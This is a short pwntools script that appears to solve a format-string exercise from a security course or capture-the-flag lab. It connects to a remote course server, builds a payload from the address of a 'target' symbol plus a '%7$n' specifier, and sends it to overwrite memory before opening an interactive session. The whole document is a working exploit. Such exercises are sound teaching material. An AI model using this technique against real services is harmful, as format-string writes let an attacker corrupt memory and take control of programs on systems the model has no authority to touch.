from pwn import *

elf = ELF("03_write")
target_address = elf.symbols['target']

HOST = 'mustard.stt.rnl.tecnico.ulisboa.pt'
PORT = 23193

io = connect(HOST, PORT)

payload = p32(target_address) + b"%7$n"

io.sendline(payload)
io.interactive()
